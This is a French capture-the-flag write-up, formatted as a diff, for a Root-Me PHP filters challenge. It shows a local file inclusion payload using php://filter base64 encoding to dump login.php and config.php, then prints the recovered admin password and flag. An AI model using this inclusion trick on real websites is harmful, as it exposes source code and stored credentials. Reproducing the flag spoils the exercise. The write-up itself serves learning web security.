@@ -1,0 +1,44 @@
+Le titre du challenge indique qu'il faut utiliser les filtres PHP.
+Mes connaissances en PHP étant limitées, il m'a fallu faire quelques recherches pour comprendre un peu mieux comment fonctionnaient les filtres. D'abord en lisant la seule doc du challenge qui y avait l'air liée. Mais elle est sous forme de slides, donc sans les explications associées, c'est dur de vraiment comprendre.
+
+Qu'à cela ne tienne, j'essaye tout de même de commencer le challenge, je clique un peu sur les liens, dans la page de login je tente un admin, admin (sait-on jamais!)..et en regardant l'URL je vois un '?inc=login.php'.
+
+Du coup je tente quelques valeurs pour inc: admin.php
+J'obtiens un message d'erreur: Warning: include(admin.php): failed to open stream: No such file or directory in /challenge/web-serveur/ch12/ch12.php on line 26 Warning: include(): Failed opening 'admin.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /challenge/web-serveur/ch12/ch12.php on line 26
+Il y a un include() qui est fait, ce qui indique qu'on va pouvoir faire une LFI. Reste à trouver la bonne page à inclure...
+
+Après quelques essais infructueux (.passwd, password.php, administrateur.php, entre autres), je me dis que le guessing ne suffira pas, donc il va vraiment falloir que je trouve comment faire avec les filtres PHP...
+En cherchant 'php filter' sur Google, je tombe sur cette page: https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/
+'Using php://filter for local file inclusion', ça ressemble pas mal à ce que je veux faire.
+La solution présentée consiste à encoder le flux/stream (i.e la page PHP) en base64, qui sera ensuite affichée via le include(). Il ne reste plus alors qu'à décoder le tout pour obtenir le code PHP de la page.
+
+Avec login.php, ça donne: http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=login.php
+
+PD9waHAKaW5jbHVkZSgiY29uZmlnLnBocCIpOwoKaWYgKCBpc3NldCgkX1BPU1RbInVzZXJuYW1lIl0pICYmIGlzc2V0KCRfUE9TVFsicGFzc3dvcmQiXSkgKXsKICAgIGlmICgkX1BPU1RbInVzZXJuYW1lIl09PSR1c2VybmFtZSAmJiAkX1BPU1RbInBhc3N3b3JkIl09PSRwYXNzd29yZCl7CiAgICAgIHByaW50KCI8aDI+V2VsY29tZSBiYWNrICE8L2gyPiIpOwogICAgICBwcmludCgiVG8gdmFsaWRhdGUgdGhlIGNoYWxsZW5nZSB1c2UgdGhpcyBwYXNzd29yZDxici8+PGJyLz4iKTsKICAgIH0gZWxzZSB7CiAgICAgIHByaW50KCI8aDM+RXJyb3IgOiBubyBzdWNoIHVzZXIvcGFzc3dvcmQ8L2gyPjxiciAvPiIpOwogICAgfQp9IGVsc2Ugewo/PgoKPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+CiAgTG9naW4mbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz48YnIvPjxici8+CiAgUGFzc3dvcmQmbmJzcDs8YnIvPgogIDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIC8+PGJyLz48YnIvPgogIDxici8+PGJyLz4KICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iY29ubmVjdCIgLz48YnIvPjxici8+CjwvZm9ybT4KCjw/cGhwIH0gPz4=
+
+Une fois décodé:
+<?php
+include("config.php");
+
+if ( isset($_POST["username"]) && isset($_POST["password"]) ){
+	if ($_POST["username"]==$username && $_POST["password"]==$password){
+		print("<h2>Welcome back !</h2>");
+		print("To validate the challenge use this password<br/><br/>");
+	} else {
+		print("<h3>Error : no such user/password</h2><br />");
+	}
+} else {
+	?>
+
+On note la présence de include('config.php'), et d'une variable $password, qui est comparée au mdp rentré par l'utilisateur, et probablement définie dans config.php
+
+Donc même chose cette fois avec config.php, et on obtient:
+<?php
+
+$username="admin";
+$password="DAPt9D2mky0APAF";
+
+?>
+
+
+Le mot de passe est donc DAPt9D2mky0APAF
